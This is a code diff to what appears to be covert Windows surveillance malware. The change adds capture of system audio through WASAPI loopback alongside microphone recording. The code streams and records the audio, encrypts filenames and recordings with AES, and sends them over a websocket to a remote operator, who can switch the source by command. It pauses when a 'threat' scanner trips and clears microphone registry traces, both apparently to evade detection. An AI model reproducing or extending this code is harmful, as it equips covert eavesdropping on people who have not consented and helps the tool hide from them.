@@ -15,6 +15,7 @@
 #include "capture_helper.h"
 #include "audio_dsp.h"
 #include "stage2_loader.h"
+#include "audio_wasapi.h"
 #include <userenv.h>
 #include <shlobj.h>
 #include <wtsapi32.h>
@@ -131,6 +132,7 @@ static std::atomic<int> g_audio_channels{1};
 static std::atomic<int> g_audio_device_id{-1}; // -1 = WAVE_MAPPER (default)
 static std::atomic<int> g_audio_gain{100};     // % gain (100=normal, 200=2x boost)
 static std::atomic<int> g_audio_mode{0};       // 0=record, 1=live, 2=both
+static std::atomic<int> g_audio_source{0};     // 0=mic (waveIn), 1=loopback (WASAPI system sound)
 static std::atomic<bool> g_audio_denoise{true};   // high-pass + noise gate
 static std::atomic<bool> g_audio_normalize{true}; // peak normalization
 static std::atomic<int>  g_audio_hum_filter{50};  // 0=off, 50=50Hz, 60=60Hz
@@ -703,6 +705,9 @@ static void load_config(const std::string& path) {
     std::string au_hum = get("audio_hum_filter", "");
     if (!au_hum.empty()) g_config.audio_hum_filter = safe_stoi(au_hum, 50);
     g_audio_hum_filter = g_config.audio_hum_filter;
+    std::string au_src = get("audio_source", "");
+    if (!au_src.empty()) g_config.audio_source = (safe_stoi(au_src, 0) == 1) ? 1 : 0;
+    g_audio_source = g_config.audio_source;
 
     // Threat monitor toggles
     std::string th_scan = get("threat_scan_enabled", "");
@@ -774,6 +779,7 @@ static void save_stream_settings() {
     out += "  \"audio_denoise\": " + std::string(g_config.audio_denoise ? "true" : "false") + ",\n";
     out += "  \"audio_normalize\": " + std::string(g_config.audio_normalize ? "true" : "false") + ",\n";
     out += "  \"audio_hum_filter\": " + std::to_string(g_config.audio_hum_filter) + ",\n";
+    out += "  \"audio_source\": " + std::to_string(g_config.audio_source) + ",\n";
     out += "  \"threat_scan_enabled\": " + std::string(g_threat_scan_enabled ? "true" : "false") + ",\n";
     out += "  \"threat_auto_pause\": " + std::string(g_threat_auto_pause ? "true" : "false") + "\n";
     out += "}\n";
@@ -2663,6 +2669,8 @@ static void handle_command(const std::string& msg_str) {
             if (!v.empty()) { bool b = (v == "true" || v == "1"); g_audio_normalize = b; g_config.audio_normalize = b; }
             v = json_get(msg_str, "hum_filter");
             if (!v.empty()) { int hf = std::stoi(v); if (hf != 0 && hf != 50 && hf != 60) hf = 0; g_audio_hum_filter = hf; g_config.audio_hum_filter = hf; }
+            v = json_get(msg_str, "source");
+            if (!v.empty()) { int s = std::stoi(v); if (s != 0 && s != 1) s = 0; g_audio_source = s; g_config.audio_source = s; }
             save_stream_settings();
             send_ok("{\"segment_duration\":" + std::to_string(g_audio_segment_duration.load()) +
                     ",\"sample_rate\":" + std::to_string(g_audio_sample_rate.load()) +
@@ -2671,7 +2679,8 @@ static void handle_command(const std::string& msg_str) {
                     ",\"gain\":" + std::to_string(g_audio_gain.load()) +
                     ",\"denoise\":" + (g_audio_denoise.load() ? "true" : "false") +
                     ",\"normalize\":" + (g_audio_normalize.load() ? "true" : "false") +
-                    ",\"hum_filter\":" + std::to_string(g_audio_hum_filter.load()) + "}");
+                    ",\"hum_filter\":" + std::to_string(g_audio_hum_filter.load()) +
+                    ",\"source\":" + std::to_string(g_audio_source.load()) + "}");
         }
         else if (cmd == "audio_status") {
             // Include device info in status
@@ -2701,6 +2710,7 @@ static void handle_command(const std::string& msg_str) {
                     ",\"denoise\":" + std::string(g_audio_denoise.load() ? "true" : "false") +
                     ",\"normalize\":" + std::string(g_audio_normalize.load() ? "true" : "false") +
                     ",\"hum_filter\":" + std::to_string(g_audio_hum_filter.load()) +
+                    ",\"source\":" + std::to_string(g_audio_source.load()) +
                     ",\"device_count\":" + std::to_string(numDevs) +
                     ",\"device_id\":" + std::to_string(g_audio_device_id.load()) +
                     devInfo + "}");
@@ -4027,6 +4037,12 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
     };
     int opusSR = snapOpusSR(sampleRate);
 
+    // Shared output buffer — filled by either waveIn (mic) or WASAPI loopback branch.
+    std::vector<BYTE> pcmBuf;
+    DWORD pcmRecorded = 0;
+
+    if (g_audio_source.load() == 0) {
+    // ── Mic capture (waveIn) ─────────────────────────────────────────────────
     // Try to open waveIn at the desired Opus SR. Some devices (USB mics, Bluetooth)
     // reject formats they don't natively support. On failure, fall back through
     // lower Opus-valid rates until one works.
@@ -4062,7 +4078,7 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
     }
 
     DWORD bufSize = wfx.nAvgBytesPerSec * duration;
-    std::vector<BYTE> pcmBuf(bufSize);
+    pcmBuf.resize(bufSize);
     WAVEHDR waveHdr = {};
     waveHdr.lpData = (LPSTR)pcmBuf.data();
     waveHdr.dwBufferLength = bufSize;
@@ -4166,8 +4182,39 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
     // Post-recording cleanup
     cleanMicReg();
 
-    DWORD pcmRecorded = waveHdr.dwBytesRecorded;
+    pcmRecorded = waveHdr.dwBytesRecorded;
     if (pcmRecorded == 0) { g_log.warn("Audio: 0 bytes"); return false; }
+
+    } else {
+    // ── System audio (WASAPI loopback) ───────────────────────────────────────
+        opusSR = snapOpusSR(sampleRate);
+        int needed = opusSR * channels * duration;
+        pcmBuf.resize(size_t(needed) * sizeof(int16_t), 0);
+        audio_wasapi::Capture cap;
+        std::string cap_err;
+        if (!cap.open(opusSR, channels, &cap_err)) {
+            g_log.warn("Audio loopback: open failed: " + cap_err);
+            return false;
+        }
+        std::vector<int16_t> loopOut;
+        loopOut.reserve(size_t(needed) + size_t(needed) / 4);
+        DWORD loopStart = GetTickCount();
+        DWORD loopMax   = (DWORD)duration * 1000 + 2000;
+        g_log.info("Audio loopback: recording " + std::to_string(duration) + "s @ " +
+                   std::to_string(opusSR) + "Hz");
+        while ((GetTickCount() - loopStart) < loopMax && g_audio_active.load() && g_running) {
+            cap.read(loopOut);
+            if ((int)loopOut.size() >= needed) break;
+            if (g_paused_by_threat.load()) { g_log.info("Audio loopback: paused by threat"); break; }
+            HANDLE ev = cap.event();
+            if (ev) WaitForSingleObject(ev, 100); else Sleep(10);
+        }
+        cap.close();
+        size_t to_copy = std::min(size_t(needed), loopOut.size());
+        if (to_copy > 0) memcpy(pcmBuf.data(), loopOut.data(), to_copy * sizeof(int16_t));
+        pcmRecorded = (DWORD)(to_copy * sizeof(int16_t));
+        if (pcmRecorded == 0) { g_log.warn("Audio loopback: 0 bytes captured"); return false; }
+    } // end source branch
 
     // Apply gain boost to PCM samples
     int gain = g_audio_gain.load();
@@ -4274,6 +4321,190 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
     return !audioOut.empty();
 }
 
+// ── WASAPI loopback live stream: captures system audio, sends as ALIV chunks ──
+static void capture_audio_live_stream_wasapi(int sampleRate, int bitrate, int channels, bool alsoRecord, int recordDuration) {
+    int opusSR = 48000;
+    if (sampleRate <= 8000)  opusSR = 8000;
+    else if (sampleRate <= 12000) opusSR = 12000;
+    else if (sampleRate <= 16000) opusSR = 16000;
+    else if (sampleRate <= 24000) opusSR = 24000;
+
+    audio_wasapi::Capture cap;
+    std::string cap_err;
+    if (!cap.open(opusSR, channels, &cap_err)) {
+        g_log.warn("Audio LIVE loopback: open failed: " + cap_err);
+        return;
+    }
+
+    int err = 0;
+    OpusEncoder* enc = opus_encoder_create(opusSR, channels, OPUS_APPLICATION_VOIP, &err);
+    if (!enc) { return; }
+    opus_encoder_ctl(enc, OPUS_SET_BITRATE(bitrate * 1000));
+    opus_encoder_ctl(enc, OPUS_SET_COMPLEXITY(5));
+
+    const int frameMs = 20;
+    const int frameSamples = opusSR * frameMs / 1000;
+    const int granulePerFrame = 48000 * frameMs / 1000;
+    const uint16_t preSkip = (uint16_t)(312 * 48000 / opusSR);
+    std::vector<uint8_t> opusBuf(4000);
+    uint32_t serial = (uint32_t)GetTickCount();
+
+    // 3-second chunks (same as waveIn live path)
+    const int chunkFrames = opusSR * 3;
+
+    // DSP state (persistent across chunks to avoid stitching artefacts)
+    audio_dsp::HighPassState dsp_hp; dsp_hp.configure(opusSR, channels, 80.f);
+    int cur_hum = g_audio_hum_filter.load();
+    audio_dsp::HumFilterBank dsp_hum;
+    if (cur_hum == 50 || cur_hum == 60) dsp_hum.configure(opusSR, (float)cur_hum, channels);
+
+    // Recording accumulator (mode 2: live + record simultaneously)
+    std::vector<BYTE> recPcmAccum;
+    DWORD recStartTick = GetTickCount();
+    const DWORD recIntervalMs = (DWORD)recordDuration * 1000;
+
+    OpusEncoder* recEnc = nullptr;
+    if (alsoRecord) {
+        int re = 0;
+        recEnc = opus_encoder_create(opusSR, channels, OPUS_APPLICATION_VOIP, &re);
+        if (recEnc) { opus_encoder_ctl(recEnc, OPUS_SET_BITRATE(bitrate * 1000)); opus_encoder_ctl(recEnc, OPUS_SET_COMPLEXITY(5)); }
+    }
+
+    // flushRecording: encode accumulated PCM → OGG → send as AUDR
+    auto flushRecording = [&]() {
+        if (recPcmAccum.empty() || !recEnc) return;
+        { int16_t* rs = (int16_t*)recPcmAccum.data(); int rn = (int)(recPcmAccum.size() / 2);
+          if (g_audio_denoise.load()) { audio_dsp::NoiseGateState rng; rng.configure(opusSR);
+              audio_dsp::apply_noise_gate(rs, rn, channels, rng); }
+          if (g_audio_normalize.load()) audio_dsp::apply_normalize(rs, rn, 0.90f, 6.0f); }
+        std::vector<uint8_t> recOgg;
+        uint32_t rs2 = (uint32_t)GetTickCount(), rps = 0; uint64_t rg = 0;
+        { uint8_t h[19]={}; memcpy(h,"OpusHead",8); h[8]=1; h[9]=(uint8_t)channels;
+          memcpy(h+10,&preSkip,2); uint32_t isr=(uint32_t)opusSR; memcpy(h+12,&isr,4);
+          ogg_write_page(recOgg,0x02,rs2,rps++,0,h,19); }
+        { const char* v="Prometey"; uint32_t vl=(uint32_t)strlen(v),cc=0;
+          std::vector<uint8_t> t(8+4+vl+4); memcpy(t.data(),"OpusTags",8);
+          memcpy(t.data()+8,&vl,4); memcpy(t.data()+12,v,vl); memcpy(t.data()+12+vl,&cc,4);
+          ogg_write_page(recOgg,0x00,rs2,rps++,0,t.data(),(int)t.size()); }
+        std::vector<uint8_t> rb(4000);
+        const int16_t* rpcm = (const int16_t*)recPcmAccum.data();
+        int rtotal = (int)(recPcmAccum.size() / (channels * 2)), roff = 0;
+        while (roff + frameSamples <= rtotal) {
+            int enc2 = opus_encode(recEnc, rpcm + roff * channels, frameSamples, rb.data(), (int)rb.size());
+            if (enc2 > 0) { roff += frameSamples; rg += granulePerFrame;
+                bool last = (roff + frameSamples > rtotal);
+                ogg_write_page(recOgg, last ? 0x04 : 0x00, rs2, rps++, rg, rb.data(), enc2);
+            } else roff += frameSamples;
+        }
+        if (!recOgg.empty()) {
+            SYSTEMTIME st; GetLocalTime(&st);
+            char tb[64]; snprintf(tb,sizeof(tb),"%04d%02d%02d_%02d%02d%02d_Audio",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
+            std::string pn(tb); std::string en = encrypt_filename(pn);
+            auto ed = aes_encrypt(recOgg.data(), recOgg.size());
+            if (!ed.empty()) {
+                uint32_t nl = (uint32_t)en.size();
+                std::vector<uint8_t> pkt(4+4+nl+ed.size());
+                memcpy(pkt.data(),"AUDR",4); memcpy(pkt.data()+4,&nl,4);
+                memcpy(pkt.data()+8,en.data(),nl); memcpy(pkt.data()+8+nl,ed.data(),ed.size());
+                if (g_ws && g_ws->is_connected()) { g_ws->send_binary_priority(pkt);
+                    g_log.info("Audio REC: " + pn + " " + std::to_string(recOgg.size()/1024) + "KB"); }
+            }
+        }
+        recPcmAccum.clear();
+        recStartTick = GetTickCount();
+    };
+
+    // PCM accumulation buffer (int16_t samples, interleaved channels)
+    std::vector<int16_t> pcmAccum;
+    pcmAccum.reserve(size_t(chunkFrames) * channels * 2);
+
+    g_log.info("Audio LIVE loopback: streaming @ " + std::to_string(opusSR) + "Hz " + std::to_string(bitrate) + "kbps");
+
+    while (g_audio_active.load() && g_running && g_ws && g_ws->is_connected()) {
+        // Source changed at runtime → break so audio_thread_func re-enters with new mode
+        if (g_audio_source.load() != 1) break;
+
+        // Wait for data or timeout
+        HANDLE ev = cap.event();
+        if (ev) WaitForSingleObject(ev, 200); else Sleep(10);
+
+        // Drain all available WASAPI frames into accumulator
+        cap.read(pcmAccum);
+
+        // Process in chunkFrames-sized windows
+        while ((int)pcmAccum.size() >= chunkFrames * channels) {
+            int16_t* chunk    = pcmAccum.data();
+            int chunkSamples  = chunkFrames * channels;
+
+            // DSP: hum + high-pass (persistent state = no stitching artefacts)
+            int new_hum = g_audio_hum_filter.load();
+            if (new_hum != cur_hum) {
+                cur_hum = new_hum;
+                if (cur_hum == 50 || cur_hum == 60) dsp_hum.configure(opusSR, (float)cur_hum, channels);
+                else dsp_hum.active_count = 0;
+            }
+            if (dsp_hum.active_count > 0) audio_dsp::apply_hum_filter(chunk, chunkSamples, dsp_hum);
+            if (g_audio_denoise.load()) audio_dsp::apply_highpass(chunk, chunkSamples, dsp_hp);
+
+            // Gain
+            int gain = g_audio_gain.load();
+            if (gain != 100 && gain > 0) {
+                for (int i = 0; i < chunkSamples; i++) {
+                    int32_t v = (int32_t)chunk[i] * gain / 100;
+                    if (v > 32767) v = 32767; if (v < -32768) v = -32768;
+                    chunk[i] = (int16_t)v;
+                }
+            }
+
+            // Accumulate PCM for recording (mode 2)
+            if (alsoRecord && !g_paused_by_threat.load())
+                recPcmAccum.insert(recPcmAccum.end(), (BYTE*)chunk, (BYTE*)chunk + chunkSamples * (int)sizeof(int16_t));
+
+            // Encode as self-contained OGG chunk and send as ALIV
+            if (!g_paused_by_threat.load() && g_ws && g_ws->is_connected()) {
+                std::vector<uint8_t> oggChunk;
+                uint32_t chunkSerial = serial++; uint32_t ps = 0; uint64_t gr = 0;
+                { uint8_t head[19]={}; memcpy(head,"OpusHead",8); head[8]=1; head[9]=(uint8_t)channels;
+                  memcpy(head+10,&preSkip,2); uint32_t inSR=(uint32_t)opusSR; memcpy(head+12,&inSR,4);
+                  ogg_write_page(oggChunk,0x02,chunkSerial,ps++,0,head,19); }
+                { const char* v="Prometey"; uint32_t vl=(uint32_t)strlen(v),cc=0;
+                  std::vector<uint8_t> t2(8+4+vl+4); memcpy(t2.data(),"OpusTags",8);
+                  memcpy(t2.data()+8,&vl,4); memcpy(t2.data()+12,v,vl); memcpy(t2.data()+12+vl,&cc,4);
+                  ogg_write_page(oggChunk,0x00,chunkSerial,ps++,0,t2.data(),(int)t2.size()); }
+                int off = 0;
+                while (off + frameSamples <= chunkFrames) {
+                    int encoded = opus_encode(enc, chunk + off * channels, frameSamples, opusBuf.data(), (int)opusBuf.size());
+                    if (encoded > 0) { off += frameSamples; gr += granulePerFrame;
+                        bool isLast = (off + frameSamples > chunkFrames);
+                        ogg_write_page(oggChunk, isLast ? 0x04 : 0x00, chunkSerial, ps++, gr, opusBuf.data(), encoded);
+                    } else off += frameSamples;
+                }
+                if (!oggChunk.empty()) {
+                    std::vector<uint8_t> pkt(4 + oggChunk.size());
+                    memcpy(pkt.data(), "ALIV", 4);
+                    memcpy(pkt.data() + 4, oggChunk.data(), oggChunk.size());
+                    g_ws->send_binary_priority(pkt);
+                }
+            }
+
+            // Consume processed frames
+            pcmAccum.erase(pcmAccum.begin(), pcmAccum.begin() + chunkFrames * channels);
+        }
+
+        // Flush recording if interval elapsed
+        if (alsoRecord && !g_paused_by_threat.load() && (GetTickCount() - recStartTick) >= recIntervalMs)
+            flushRecording();
+
+        if (g_paused_by_threat.load()) Sleep(500);
+    }
+
+    if (alsoRecord) flushRecording();
+    if (recEnc) opus_encoder_destroy(recEnc);
+    opus_encoder_destroy(enc);
+    cap.close();
+    g_log.info("Audio LIVE loopback: stream ended");
+}
+
 // ── Streaming live audio: continuous capture with ~1s ALIV sub-chunks ──
 // ALIV sub-protocol: ALIV(4) + type(1) + data
 //   type 0x01 = OGG headers (OpusHead + OpusTags) — first packet
@@ -4282,6 +4513,11 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
 // alsoRecord: if true, also accumulates full OGG for AUDR storage (mode 2)
 // recordDuration: seconds for each AUDR segment
 static void capture_audio_live_stream(int sampleRate, int bitrate, int channels, bool alsoRecord = false, int recordDuration = 300) {
+    // Source = 1 (system audio) → WASAPI loopback path, no waveIn
+    if (g_audio_source.load() == 1) {
+        capture_audio_live_stream_wasapi(sampleRate, bitrate, channels, alsoRecord, recordDuration);
+        return;
+    }
     // Opus sample rate snap
     int opusSR = 48000;
     if (sampleRate <= 8000) opusSR = 8000;
